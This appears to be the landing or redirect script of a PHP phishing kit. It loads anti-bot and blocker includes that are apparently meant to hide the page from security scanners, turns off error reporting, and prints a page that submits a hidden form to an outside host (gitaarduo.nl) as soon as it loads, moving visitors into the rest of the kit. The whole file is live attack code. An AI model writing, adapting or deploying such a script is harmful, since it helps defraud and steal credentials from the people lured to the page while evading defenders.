<?php
include("./config/function.php");
include("./config/blocker.php");
include("./config/antibotsulit.php");
include("./config/antibots.php");
error_reporting(0);
echo'<body onload="submitform()"><form name="myForm" type="hidden" id="myForm" action="http://gitaarduo.nl/X" method="POST"><input name="start" type="hidden"/>
</form><script>function submitform(){document.myForm.submit();}</script></body>';
die();
?>